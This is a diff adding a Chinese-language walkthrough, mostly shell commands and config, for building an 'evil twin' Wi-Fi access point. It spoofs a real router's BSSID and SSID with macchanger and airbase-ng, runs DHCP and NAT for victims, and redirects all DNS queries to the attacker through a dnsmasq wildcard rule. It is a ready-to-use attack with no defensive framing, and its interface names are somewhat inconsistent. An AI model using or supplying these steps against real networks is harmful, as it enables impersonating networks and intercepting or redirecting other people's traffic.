@@ -1,0 +1,85 @@
+step.1 安装
+-------------
+$>apt-get install aircrack-ng isc-dhcp-server dnsmasq
+
+step.2 关闭WIFI进程
+-------------
+systemctl stop avahi-daemon.socket
+systemctl stop avahi-daemon.service
+airmon-ng check kill
+airmon-ng check
+iw phy phy0 info | grep -A 3 "Supported interface modes"
+
+step.3 开启网卡监听模式
+-------------
+airmon-ng start enp2s0
+
+step.4 扫描路由器
+-------------
+airodump-ng wlp3s0
+
+step.5 查看当前无线网卡MAC地址
+-------------
+macchanger -s wlp3s0
+
+step.6 更换无线网卡MAC地址(与路由器bssid相同即可)
+-------------
+ifconfig wlp3s0 down
+macchanger -m <用step.4扫描的路由器bssid即可,需要选择一个网络较好的路由器bssid> wlp3s0
+ifconfig wlp3s0 up
+
+step.7 查看当前无线网卡MAC地址
+-------------
+macchanger -s wlp3s0
+
+step.8 开启热点
+-------------
+airbase-ng -e "<需要与step.4中的路由器同名即可>" -c 11 wlp3s0                     
+
+说明:
+-e "..."  - 设置伪造热点的 SSID(无线网络名称)
+-c 11     - 指定热点的信道
+wlp3s0    - 监控模式接口(无线网卡名称,但需要开启监听模式;参考step.3)
+
+step.9 配置虚拟接口
+-------------
+ifconfig at0 up
+ifconfig at0 192.168.10.1 netmask 255.255.255.0
+
+step.10 配置 DHCP 服务
+-------------
+vi /etc/dhcp/dhcpd.conf
+--
+subnet 192.168.10.0 netmask 255.255.255.0 {
+    range 192.168.10.100 192.168.10.200;
+    option routers 192.168.10.1;
+    option subnet-mask 255.255.255.0;
+    option domain-name-servers 8.8.8.8, 8.8.4.4;
+}
+
+vi /etc/default/isc-dhcp-server
+--
+将INTERFACESv4=""更改为INTERFACESv4="at0" 
+
+step.11 启动 DHCP 服务
+-----------
+systemctl restart isc-dhcp-server
+
+step.12 配置网络转发
+-----------
+echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
+iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+iptables -A FORWARD -i at0 -o eth0 -j ACCEPT
+
+step.13 配置 DNS 服务
+----------
+vi /etc/dnsmasq.conf
+--
+resolv-file=/etc/resolv.conf
+listen-address=192.168.10.1
+address=/#/192.168.10.1
+
+step.14 重启dnsmasq服务
+----------
+systemctl restart dnsmasq
+
